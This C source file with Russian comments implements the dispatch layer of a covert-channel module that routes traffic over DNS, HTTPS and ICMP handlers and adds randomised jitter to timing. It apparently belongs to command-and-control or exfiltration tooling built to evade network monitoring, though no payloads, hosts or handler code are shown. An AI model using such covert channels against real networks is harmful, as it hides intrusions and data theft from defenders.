/**
 * @file covert_channel.c
 * @brief Основная реализация модуля скрытых коммуникационных каналов
 *
 * Этот файл содержит реализацию основного интерфейса для работы со 
 * скрытыми коммуникационными каналами (DNS, HTTPS, ICMP)
 *
 * @author NeuroZond Team
 * @date 2025-04-28
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "covert_channel.h"

/* Глобальные обработчики для различных типов каналов */
static CovertChannelHandler dns_handler;
static CovertChannelHandler https_handler;
static CovertChannelHandler icmp_handler;
static int handlers_registered = 0;

/* Прототипы функций для регистрации обработчиков */
extern void register_dns_channel_handler(CovertChannelHandler *handler);
extern void register_https_channel_handler(CovertChannelHandler *handler);
extern void register_icmp_channel_handler(CovertChannelHandler *handler);

/**
 * @brief Регистрирует все доступные обработчики каналов
 */
static void register_all_handlers(void) {
    if (handlers_registered) {
        return;
    }
    
    /* Регистрация обработчиков для различных типов каналов */
    memset(&dns_handler, 0, sizeof(dns_handler));
    memset(&https_handler, 0, sizeof(https_handler));
    memset(&icmp_handler, 0, sizeof(icmp_handler));
    
    register_dns_channel_handler(&dns_handler);
    register_https_channel_handler(&https_handler);
    register_icmp_channel_handler(&icmp_handler);
    
    /* Инициализация генератора случайных чисел */
    srand((unsigned int)time(NULL));
    
    handlers_registered = 1;
}

/**
 * @brief Возвращает обработчик для указанного типа канала
 * 
 * @param channel_type Тип канала 
 * @return Указатель на обработчик или NULL, если тип не поддерживается
 */
static CovertChannelHandler *get_handler_for_type(int channel_type) {
    switch (channel_type) {
        case COVERT_CHANNEL_TYPE_DNS:
            return &dns_handler;
            
        case COVERT_CHANNEL_TYPE_HTTPS:
            return &https_handler;
            
        case COVERT_CHANNEL_TYPE_ICMP:
            return &icmp_handler;
            
        default:
            return NULL;
    }
}

/**
 * @brief Инициализирует скрытый канал коммуникации с указанной конфигурацией
 * 
 * @param config Конфигурация канала
 * @return Дескриптор канала или NULL при ошибке
 */
void *covert_channel_init(const CovertChannelConfig *config) {
    if (!config) {
        return NULL;
    }
    
    /* Регистрируем обработчики при первом вызове */
    register_all_handlers();
    
    /* Получаем обработчик для указанного типа канала */
    CovertChannelHandler *handler = get_handler_for_type(config->channel_type);
    if (!handler || !handler->init) {
        return NULL;
    }
    
    /* Инициализируем канал с помощью специфического обработчика */
    return handler->init(config);
}

/**
 * @brief Устанавливает соединение через скрытый канал
 * 
 * @param channel Дескриптор канала
 * @return Код статуса операции
 */
int covert_channel_connect(void *channel) {
    if (!channel) {
        return COVERT_CHANNEL_ERROR;
    }
    
    /* Получаем тип канала из его внутренней структуры */
    int channel_type = *((int *)channel);
    
    /* Получаем обработчик для указанного типа канала */
    CovertChannelHandler *handler = get_handler_for_type(channel_type);
    if (!handler || !handler->connect) {
        return COVERT_CHANNEL_ERROR;
    }
    
    /* Устанавливаем соединение с помощью специфического обработчика */
    return handler->connect(channel);
}

/**
 * @brief Отправляет данные через скрытый канал
 * 
 * @param channel Дескриптор канала
 * @param data Указатель на данные
 * @param data_len Длина данных
 * @return Количество отправленных байт или код ошибки
 */
int covert_channel_send(void *channel, const unsigned char *data, int data_len) {
    if (!channel || !data || data_len <= 0) {
        return COVERT_CHANNEL_ERROR;
    }
    
    /* Получаем тип канала из его внутренней структуры */
    int channel_type = *((int *)channel);
    
    /* Получаем обработчик для указанного типа канала */
    CovertChannelHandler *handler = get_handler_for_type(channel_type);
    if (!handler || !handler->send) {
        return COVERT_CHANNEL_ERROR;
    }
    
    /* Отправляем данные с помощью специфического обработчика */
    return handler->send(channel, data, data_len);
}

/**
 * @brief Получает данные через скрытый канал
 * 
 * @param channel Дескриптор канала
 * @param buffer Буфер для получаемых данных
 * @param buffer_len Размер буфера
 * @return Количество полученных байт или код ошибки
 */
int covert_channel_receive(void *channel, unsigned char *buffer, int buffer_len) {
    if (!channel || !buffer || buffer_len <= 0) {
        return COVERT_CHANNEL_ERROR;
    }
    
    /* Получаем тип канала из его внутренней структуры */
    int channel_type = *((int *)channel);
    
    /* Получаем обработчик для указанного типа канала */
    CovertChannelHandler *handler = get_handler_for_type(channel_type);
    if (!handler || !handler->receive) {
        return COVERT_CHANNEL_ERROR;
    }
    
    /* Получаем данные с помощью специфического обработчика */
    return handler->receive(channel, buffer, buffer_len);
}

/**
 * @brief Проверяет, установлено ли соединение через скрытый канал
 * 
 * @param channel Дескриптор канала
 * @return Ненулевое значение, если соединение установлено, иначе 0
 */
int covert_channel_is_connected(void *channel) {
    if (!channel) {
        return 0;
    }
    
    /* Получаем тип канала из его внутренней структуры */
    int channel_type = *((int *)channel);
    
    /* Получаем обработчик для указанного типа канала */
    CovertChannelHandler *handler = get_handler_for_type(channel_type);
    if (!handler || !handler->is_connected) {
        return 0;
    }
    
    /* Проверяем соединение с помощью специфического обработчика */
    return handler->is_connected(channel);
}

/**
 * @brief Устанавливает параметры джиттера для канала
 * 
 * @param channel Дескриптор канала
 * @param min_jitter Минимальный джиттер в мс
 * @param max_jitter Максимальный джиттер в мс
 */
void covert_channel_set_jitter(void *channel, int min_jitter, int max_jitter) {
    if (!channel) {
        return;
    }
    
    /* Получаем тип канала из его внутренней структуры */
    int channel_type = *((int *)channel);
    
    /* Получаем обработчик для указанного типа канала */
    CovertChannelHandler *handler = get_handler_for_type(channel_type);
    if (!handler || !handler->set_jitter) {
        return;
    }
    
    /* Устанавливаем джиттер с помощью специфического обработчика */
    handler->set_jitter(channel, min_jitter, max_jitter);
}

/**
 * @brief Освобождает ресурсы, занятые скрытым каналом
 * 
 * @param channel Дескриптор канала
 */
void covert_channel_cleanup(void *channel) {
    if (!channel) {
        return;
    }
    
    /* Получаем тип канала из его внутренней структуры */
    int channel_type = *((int *)channel);
    
    /* Получаем обработчик для указанного типа канала */
    CovertChannelHandler *handler = get_handler_for_type(channel_type);
    if (!handler || !handler->cleanup) {
        return;
    }
    
    /* Освобождаем ресурсы с помощью специфического обработчика */
    handler->cleanup(channel);
}

/**
 * @brief Применяет шум к времени задержки
 * 
 * @param min_jitter Минимальный джиттер в мс
 * @param max_jitter Максимальный джиттер в мс
 * @return Случайное время задержки в миллисекундах
 */
int covert_channel_apply_jitter(int min_jitter, int max_jitter) {
    if (min_jitter < 0) min_jitter = 0;
    if (max_jitter < min_jitter) max_jitter = min_jitter;
    
    /* Если min и max равны, возвращаем константное значение */
    if (min_jitter == max_jitter) {
        return min_jitter;
    }
    
    /* Генерируем случайное значение в диапазоне [min_jitter, max_jitter] */
    return min_jitter + (rand() % (max_jitter - min_jitter + 1));
}

/**
 * @brief Выполняет задержку с применением джиттера
 * 
 * @param min_jitter Минимальный джиттер в мс
 * @param max_jitter Максимальный джиттер в мс
 */
void covert_channel_jitter_delay(int min_jitter, int max_jitter) {
    int delay_ms = covert_channel_apply_jitter(min_jitter, max_jitter);
    
    /* Выполняем задержку */
    struct timespec ts;
    ts.tv_sec = delay_ms / 1000;
    ts.tv_nsec = (delay_ms % 1000) * 1000000L;
    
    nanosleep(&ts, NULL);
} 